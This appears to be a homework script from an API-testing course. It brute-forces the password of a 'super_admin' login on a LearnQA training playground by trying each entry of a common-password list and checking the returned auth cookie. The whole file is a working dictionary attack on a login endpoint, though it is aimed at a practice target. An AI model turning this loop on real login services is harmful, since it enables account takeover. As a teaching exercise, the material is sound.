import requests

# объявляем нужные переменные для задания
url_getpass = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_check_auth = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
login = 'super_admin'

# пишем пароли из википедии в список из файла
with open("password.txt") as file:
    password_list = file.read().splitlines()
file.close()

# чистим список от повторов паролей
password_list_no_repeat = []
for pwd in password_list:
    if pwd not in password_list_no_repeat:
        password_list_no_repeat.append(pwd)

# подбор пароля с использованием паролей из списка
for password in password_list_no_repeat:
    payload = {'login': login, 'password': password}
    response1 = requests.post(url_getpass, data=payload)
    auth_cookie = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': auth_cookie}
    response2 = requests.post(url_check_auth, cookies=cookies)
    if response2.text == 'You are authorized':
        print(response2.text, "with password:", password)
        break
